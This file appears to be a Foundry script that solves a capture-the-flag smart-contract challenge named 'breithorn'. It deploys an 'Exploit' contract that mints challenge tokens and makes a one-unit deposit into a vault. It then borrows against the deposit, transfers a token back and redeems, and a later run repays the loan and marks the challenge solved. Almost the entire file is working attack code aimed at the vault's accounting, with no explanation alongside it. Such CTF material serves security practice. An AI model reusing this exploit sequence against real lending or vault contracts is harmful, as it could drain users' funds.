pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";

import {Challenge,Vault,VaultFactory,Token} from "src/CREW_2025/breithorn/Challenge.sol";
import {Account} from "src/CREW_2025/breithorn/lib/Account.sol";
import "forge-std/StdJson.sol"; 

contract Solve is Script{
    using stdJson for *;
    function run()public{
        string memory deploy_path=string.concat("broadcast/Deploy.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        Challenge chall;
        try vm.readFile(deploy_path){
            string memory json = vm.readFile(deploy_path);
            address deployed = json.readAddress(".transactions[0].contractAddress");
            chall=Challenge(deployed);
        }catch{
            revert("Challenge Not Yet Deployed");
        }
        string memory exploit_path=string.concat("broadcast/Solve.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        try vm.readFile(exploit_path){
            string memory json = vm.readFile(exploit_path);
            address deployed = json.readAddress(".transactions[0].contractAddress");
            vm.startBroadcast();
            Exploit exploit=Exploit(deployed);
            exploit.pwn2();
            chall.solve();
            require(chall.isSolved(),"Challenge Not Solved");
            vm.stopBroadcast();
            
        }catch{
            console.log("CATCH");
            vm.startBroadcast();
            Exploit exploit=new Exploit(chall);
            VaultFactory factory=chall.vaultFactory();
            Vault vault=factory.allVaults(0);
            Token token=Token(address(vault.asset()));
            token.mintToPlayer();
            token.transfer(address(exploit), token.balanceOf(msg.sender));
            exploit.pwn1();
            vm.stopBroadcast();
        }

    }   

}



contract Exploit{

    Challenge chall;
    Vault vault;
    Token token;
    VaultFactory factory;
    constructor(Challenge _chall){
        chall=_chall;
        uint256[][] memory data = new uint256[][](1);
        data[0] = new uint256[](3);
        data[0][0] = 0;
        data[0][1] = 0;
        data[0][2] = 0;
        VaultFactory factory=chall.vaultFactory();
        factory.deploy(data);
    }

    function pwn1()public{
        
        factory = chall.vaultFactory();
        vault=factory.allVaults(0);
        token= Token(address(vault.asset()));
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, address(this));
        console.log(vault.balanceOf(address(this)));
        vault.borrowAsset(1, 1, address(this));
        token.transfer(address(vault), 1);
        vault.redeem(1, address(this), address(this));
    }


    function pwn2()public{
        vault.repayAsset(1, address(this));
    }
}